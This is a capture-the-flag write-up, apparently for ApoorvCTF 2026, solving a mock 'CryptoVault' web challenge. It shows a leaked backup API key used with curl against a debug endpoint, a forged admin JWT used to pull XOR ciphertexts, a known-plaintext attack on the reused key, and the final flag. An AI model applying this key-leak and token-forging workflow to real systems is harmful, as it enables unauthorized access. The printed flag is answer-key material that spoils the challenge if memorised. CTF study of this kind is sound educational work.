* First hint html

```

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoVault - Secure Message Storage</title>
    <link rel="stylesheet" href="/static/css/style.css">
    <!-- Powered by CryptoVault API v1 -->
    <!-- Internal build: 1.0.3-dev -->
    <!-- Debug endpoint available at /api/v1/health for system status -->
</head>

<body>
    <nav class="navbar">
        <div class="nav-brand">
            <span class="lock-icon">&#x1F512;</span> CryptoVault
        </div>
        <div class="nav-links">
            <a href="/">Home</a>
            <a href="/login">Login</a>
            <a href="/register">Register</a>
        </div>
    </nav>

    <main class="hero">
        <div class="hero-content">
            <h1>Military-Grade* Message Encryption</h1>
            <p class="subtitle">Store your most sensitive messages with our state-of-the-art XOR stream cipher
                protection.</p>
            <div class="cta-buttons">
                <a href="/register" class="btn btn-primary">Get Started</a>
                <a href="/login" class="btn btn-secondary">Sign In</a>
            </div>
            <p class="disclaimer">* Our security team would like to clarify that this term has no standardized meaning.
            </p>
        </div>
    </main>

    <section class="features">
        <div class="feature-card">
            <h3>&#x1F510; End-to-End Encryption</h3>
            <p>All messages are encrypted using our proprietary stream cipher before storage.</p>
        </div>
        <div class="feature-card">
            <h3>&#x1F4E6; Secure Vault</h3>
            <p>Access your encrypted messages anytime through our RESTful API.</p>
        </div>
        <div class="feature-card">
            <h3>&#x1F6E1; Zero Knowledge</h3>
            <p>We can't read your messages. Nobody can. Probably. We hope.</p>
        </div>
    </section>

    <footer>
        <p>&copy; 2026 CryptoVault Inc. | Founded 2026 | <a href="/api/v1/health">System Status</a></p>
    </footer>

    <!-- TODO: Remove before production deployment -->
    <!-- Developer Notes:
         - API Base: /api/v1/
         - Backup config was moved to /backup/ directory
         - Old JS app bundle still references config paths, clean up later
         - See /static/js/app.js for frontend API integration
    -->
    <script src="/static/js/app.js"></script>
</body>

</html>
```

* Old entries in JavaScript - /static/js/app.js

```
/**
 * CryptoVault Frontend Application
 * Version: 1.0.3-dev
 * ApoorvCTF 2026 - Days of Future Past
 * Author: fl4nk3r
 * NOTE: This file handles API communication for the CryptoVault platform.
 */

(function() {
    'use strict';

    // API Configuration
    const CONFIG = {
        apiBase: '/api/v1',
        version: '1.0.3',
        // TODO: Remove hardcoded backup path reference before production
        // The config backup at /backup/config.json.bak should be deleted
        backupConfig: '/backup/config.json.bak',
    };

    // Debug helper (disable in production)
    const DEBUG = true;

    if (DEBUG) {
        console.log('%c[CryptoVault Debug]', 'color: #00d4aa; font-weight: bold;', 
            'Application loaded. API base:', CONFIG.apiBase);
        console.log('%c[CryptoVault Debug]', 'color: #00d4aa; font-weight: bold;', 
            'Available endpoints: /health, /debug, /auth/register, /auth/login, /vault/messages');
        console.log('%c[CryptoVault Debug]', 'color: #f59e0b; font-weight: bold;', 
            'WARNING: Debug mode is enabled. Sensitive endpoints may be accessible.');
        // console.log('Debug endpoint requires X-API-Key header. Check backup config for key.');
    }

    // API helper
    window.CryptoVaultAPI = {
        call: async function(endpoint, options = {}) {
            const url = CONFIG.apiBase + endpoint;
            const token = localStorage.getItem('jwt_token');
            
            const headers = {
                'Content-Type': 'application/json',
                ...options.headers
            };

            if (token) {
                headers['Authorization'] = `Bearer ${token}`;
            }

            try {
                const response = await fetch(url, { ...options, headers });
                return await response.json();
            } catch (error) {
                console.error('[CryptoVault]', 'API call failed:', error);
                return { error: 'Network error' };
            }
        },

        // Check system health
        health: function() {
            return this.call('/health');
        },

        // Debug info (requires API key)
        debug: function(apiKey) {
            return this.call('/debug', {
                headers: { 'X-API-Key': apiKey }
            });
        },

        // Get vault messages (requires admin JWT)
        getMessages: function() {
            return this.call('/vault/messages');
        }
    };

    // Easter egg for curious developers
    console.log('%c' + [
        '╔══════════════════════════════════════╗',
        '║  Looking at the console? Smart move. ║',
        '║  Check robots.txt for more clues...  ║',
        '╚══════════════════════════════════════╝'
    ].join('\n'), 'color: #3b82f6;');

})();
```

* backup - /backup/config.json.bak

```
{
  "api_key": "d3v3l0p3r_acc355_k3y_2024",
  "app_name": "CryptoVault",
  "database": "sqlite:///cryptovault.db",
  "debug_mode": true,
  "internal_endpoints": [
    "/api/v1/debug",
    "/api/v1/health",
    "/api/v1/vault/messages"
  ],
  "jwt_algorithm": "HS256",
  "notes": "Remember to rotate the API key before production deployment!",
  "version": "1.0.3-internal"
}
```

* debug 

```
curl -H "X-API-Key: d3v3l0p3r_acc355_k3y_2024" http://chals1.apoorvctf.xyz:8001/api/v1/debug | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   662  100   662    0     0   1069      0 --:--:-- --:--:-- --:--:--  1071
{
  "debug_info": {
    "auth_config": {
      "algorithm": "HS256",
      "roles": [
        "viewer",
        "editor",
        "admin"
      ],
      "secret_derivation_hint": "Company name (lowercase) concatenated with founding year",
      "secret_key_hash_sha256": "e53e6e2d3018dce302f876eda97d3852f5f1a81192a5f947ed89da9832ea17b8",
      "token_expiry_hours": 2
    },
    "company_info": {
      "domain": "cryptovault.io",
      "founded": 2026,
      "name": "CryptoVault"
    },
    "framework": "Flask",
    "python_version": "3.11.x",
    "server": "CryptoVault v1.0.3",
    "vault_info": {
      "access_level_required": "admin",
      "encryption_method": "XOR stream cipher",
      "endpoint": "/api/v1/vault/messages",
      "total_encrypted_messages": 15
    },
    "warning": "This debug endpoint should be disabled in production!"
  }
}

```

* mint token with script for jwt
* vault messages

```
 curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NzI4Njg4NDQsImV4cCI6MTc3Mjg3MjQ0NH0.aLXl221EjSa_cH6Fqjo2lX87b4tHoOWfOQOLMp6qX5k" http://chals1.apoorvctf.xyz:8001/api/v1/vault/messages | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4233  100  4233    0     0   5446      0 --:--:-- --:--:-- --:--:--  5440
{
  "access_level": "admin",
  "disclaimer": "* Marketing department wrote this. Security team disagrees.",
  "encryption": "XOR stream cipher (military-grade*)",
  "messages": [
    {
      "ciphertext_hex": "05c1534391cdc745386361e7e94b94c2819b45582673c78aba3b27cad5eb3f57bcb33bf1a7c4a16a17f76c02a8bee5a9f458b1ac52b85c0af52f8a4864f74b1f66f6235e3e6c7d4a793a809669b4e0f2fb221bf652058dc9c6b27d7948ff9b84d657f66d3b8c74f7d0",
      "id": 1,
      "length": 105,
      "timestamp": "2026-01-01T10:00:00Z"
    },
    {
      "ciphertext_hex": "11db4f5dc5d6c852796068f3ac02828c8c8648083378c791ee702ada91eb2210eea52be1b0c5f57854e77605fbffeaa3f25ff0be59af190cee3ecb5565fd500a2fea3509796a654b6c3199802ca1a1f8f86e02f946139ac9d0a56c7148ff97839756f367",
      "id": 2,
      "length": 100,
      "timestamp": "2026-01-02T11:00:00Z"
    },
    {
      "ciphertext_hex": "0bd2444ac5d1d4423d7667eaba028587839d540e2231d090bc3b2acdd2f02840e8a931fcf5c8a63944f47f13a8aae9b2e840b1ad54b94058f53e8e0668f1525825ec254b3e7b76586a38848b2ef2e3e9f26305eb16098bc9d7b8606c45ee8a859a43",
      "id": 3,
      "length": 98,
      "timestamp": "2026-01-03T12:00:00Z"
    },
    {
      "ciphertext_hex": "07c75e5286c9c5452a336df1e94c8896cf9a541d2331dc90ee7021ccc6a22558f9e035f7ac81bc7f17e17113f1ffe4a7ef0cf4a14cb05611f27b9b4774ea400a28ed6c40703f6c4c603e83c53ea0e8efe36700b85a01918ec1b66a79",
      "id": 4,
      "length": 92,
      "timestamp": "2026-01-04T13:00:00Z"
    },
    {
      "ciphertext_hex": "12db4f138dcbd343366170bea644c7819d8d410c2876da9ebe733683d8f17156f5ac32f7b181a27043fd3913f0beeab6ed49e2f94bb45c0ae37b984b61f2495823ec3e466c6c245a6c2a9e802df2f5f4e36302b8550f9299c6b860755aee",
      "id": 5,
      "length": 94,
      "timestamp": "2026-01-05T14:00:00Z"
    },
    {
      "ciphertext_hex": "14d65f4084c0cc5279786ce7ba5695878e9942583364da91ee7a6fccdfe77144f5ad3bb2a5c0b1395efb6d19a8bea7abe042e8f948b5541da62b8a4220e94d1125f66c406d3f624c633b8c882cbcf5fafb6e17b85f0e8c8cd7a27f79",
      "id": 6,
      "length": 92,
      "timestamp": "2026-01-06T15:00:00Z"
    },
    {
      "ciphertext_hex": "05d2585683d7cc17387d68f2b0518e91cf9b57582478d897ab693bc6c9f67140fda92ce1f5c2b47717e67519ffb3fee6f349e7bc5db01908ea3a824874fb5d0c66ea245b716a63512d33828220b1e0f7b7660bfc43038b80dbb9",
      "id": 7,
      "length": 90,
      "timestamp": "2026-01-07T16:00:00Z"
    },
    {
      "ciphertext_hex": "08d25e4697c3cc17357267f9bc438087cf9c500b6762dc8dbb783bd6c3e77151f2a47ee0b0d1b06d5ee17019e6fff0aee84ff9f951bd521df57b985261ea4c0b32f72f48723f654d793e8e8e3af2f7fee57b4efd50069a8ac0be7b79",
      "id": 8,
      "length": 92,
      "timestamp": "2026-01-08T17:00:00Z"
    },
    {
      "ciphertext_hex": "09dd4956c5c3804736617df7a64cc78d89d445102231c39ab73b26d091f03453f3b63be0b0c5f57043b57a17e6ffe5a3a15ef4ac4fb95d58f234cb4265fd570136ea6c5d767a244b68328c8c27bbeffcb76f0beb4501988cc7",
      "id": 9,
      "length": 89,
      "timestamp": "2026-01-09T18:00:00Z"
    },
    {
      "ciphertext_hex": "05c1534391cdc745386361f7aa02848a8e985d1d2976cd8cee7a3dc691e63443f5a730f7b181a17617e17c17ebb7a7b1e955b1a94eb3491df47b804379be481928ff2b4c737a6a4d2d369ec52aa0e8effe610ff4",
      "id": 10,
      "length": 84,
      "timestamp": "2026-01-10T19:00:00Z"
    },
    {
      "ciphertext_hex": "15dc46458cccc7172d7b60ede952958d8d9854156763cd8ebb723dc6c2a22151e8a93bfcb6c4f57059e16c1ffcb6e8a8a14dffbd1cbd191fe9348f0675f0411d34ed3848707b6d576a7f828369aaeee9b76d1efd44018b80dbb97e",
      "id": 11,
      "length": 91,
      "timestamp": "2026-01-11T20:00:00Z"
    },
    {
      "ciphertext_hex": "15dc4756c5cfc5442a726efbba028a8396d450083774c98dee6f2083d2ed3f44fda930b2b3cdb47e44b57b03fcffe8a8ed55b1b652b9190fef37870666eb49143fbe284c7d6d7d49797f8e8a3ba0e4f8e36e17",
      "id": 12,
      "length": 83,
      "timestamp": "2026-01-12T21:00:00Z"
    },
    {
      "ciphertext_hex": "12db4f1397c7c15b797565ffae028e91cf9541172863de9cba7d3490c7b12349c3f527a7e292b8465fa12c29bc80f0f5b547ffea09e94458e7358f0661f2495829ea244c6c6c24587f3acd8120a1f5e9f6611af1590e8c",
      "id": 13,
      "length": 87,
      "timestamp": "2026-01-13T22:00:00Z"
    },
    {
      "ciphertext_hex": "12db4f1383cec150797b60faad4789c2869a110c2f78dbdfad732ecfdde73f57f9e037e1f5d2a06b45fa6c18ecbae3e6e355b1b455af551de73f824867be4c1620f13e447f6b6d56637f8c8b2df2e5fef46d17eb",
      "id": 14,
      "length": 84,
      "timestamp": "2026-01-14T23:00:00Z"
    },
    {
      "ciphertext_hex": "15d6494697cbd44e796761eca657808acf9b530b2464da96ba626fced0fb7154f9ac3febf5c0a16d56f67213faaca7a4f458b1b048fc571df03e990670ec4a0e2ffa295a3e6d6158617f8e9730a2f5f4f0700fe85e099cc9c4a562684ce88a899954",
      "id": 15,
      "length": 98,
      "timestamp": "2026-01-15T24:00:00Z"
    }
  ],
  "note": "All messages are encrypted with our proprietary encryption system. Totally unbreakable.",
  "total_messages": 15,
  "vault": "CryptoVault Encrypted Message Store"
}

```

* tip : additionally robots.txt also had hint

```
# CryptoVault Crawler Rules
User-agent: *
Disallow: /backup/
Disallow: /api/v1/debug
Disallow: /api/v1/internal/
```

* XOR cipher texts to nullify the key and then do known plain text attack with known key format "apoorvctf{" for flag -> apoorvctf{3v3ry_5y573m_h45_4_w34kn355} 
